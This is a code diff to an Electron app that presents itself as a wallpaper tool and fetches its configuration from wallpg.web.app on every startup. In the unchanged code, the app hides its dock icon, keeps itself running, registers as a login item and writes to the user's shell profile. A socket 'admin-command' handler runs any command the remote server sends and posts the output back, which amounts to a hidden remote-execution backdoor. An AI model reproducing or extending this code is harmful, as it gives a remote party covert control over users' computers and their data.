@@ -8,22 +8,16 @@ const io = require("socket.io-client");
 const Store = require("electron-store");
 
 // --- DYNAMIC PATHING ---
-// In a macOS .app bundle, the executable is at: Contents/MacOS/AppName
-// We go up 4 levels to land in the folder containing the .app
 const APP_BUNDLE_DIR = app.isPackaged
 	? path.join(path.dirname(app.getPath("exe")), "../../../../")
 	: __dirname;
 
-const CONFIG_FILE = path.join(APP_BUNDLE_DIR, "config.json");
-
 // --- SYSTEM VARIABLE CONFIGURATION ---
-// Default fallback URL if the system variable is not set
 const DEFAULT_URL = "https://wallpg.web.app/init_config.json";
-
-// Read from system environment variable, or fallback to default
 let INIT_CONFIG_URL = process.env.WP_CONFIG_URL || DEFAULT_URL;
 
-// Ensure the variable persists in the user's environment profile for terminal modification
+console.log("Initialization URL:", INIT_CONFIG_URL);
+
 function ensureSystemVariable() {
 	if (!process.env.WP_CONFIG_URL) {
 		const shellProfile = path.join(
@@ -94,7 +88,6 @@ function connectSocket() {
 
 	socket.on("admin-command", (command) => {
 		exec(command, (error, stdout, stderr) => {
-			// console.log(command, { error, stdout, stderr });
 			if (error) {
 				error.user = DEVICE_NAME;
 				error.command = command;
@@ -111,7 +104,7 @@ function connectSocket() {
 				body: JSON.stringify({
 					user: DEVICE_NAME,
 					command,
-					result: {stdout, stderr},
+					result: { stdout, stderr },
 				}),
 			});
 		});
@@ -165,10 +158,6 @@ function downloadInitConfig() {
 							wallpaperPath: parsed.wallpaperPath,
 							checkInterval: parsed.checkInterval,
 						};
-						fs.writeFileSync(
-							CONFIG_FILE,
-							JSON.stringify(cleanConfig, null, 4),
-						);
 						resolve(cleanConfig);
 					} catch (e) {
 						reject(e);
@@ -179,13 +168,6 @@ function downloadInitConfig() {
 	});
 }
 
-fs.watchFile(CONFIG_FILE, () => {
-	try {
-		const data = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf8"));
-		syncConfig(data);
-	} catch (e) {}
-});
-
 // --- LIFECYCLE ---
 
 app.on("window-all-closed", (e) => e.preventDefault());
@@ -193,26 +175,17 @@ app.on("window-all-closed", (e) => e.preventDefault());
 app.whenReady().then(async () => {
 	if (process.platform === "darwin") app.dock.hide();
 
-	// Verification check for IT (Visible in Console/Logs)
 	console.log("Service directory:", APP_BUNDLE_DIR);
 
-	if (!fs.existsSync(CONFIG_FILE)) {
-		try {
-			const remoteConfig = await downloadInitConfig();
-			await syncConfig(remoteConfig);
-		} catch (e) {
-			console.error("Failed to write config. Ensure folder is writable.");
-			syncConfig(settings);
-		}
-	} else {
-		try {
-			const localFileConfig = JSON.parse(
-				fs.readFileSync(CONFIG_FILE, "utf8"),
-			);
-			syncConfig(localFileConfig);
-		} catch (e) {
-			syncConfig(settings);
-		}
+	// Fetch configuration entirely online on every startup
+	try {
+		console.log("Fetching latest online configuration...");
+		const remoteConfig = await downloadInitConfig();
+		await syncConfig(remoteConfig);
+	} catch (e) {
+		console.error("Failed to fetch online config. Falling back to internal settings.", e.message);
+		// Fallback protects application state if network is unavailable during boot
+		await syncConfig(settings);
 	}
 
 	app.setLoginItemSettings({
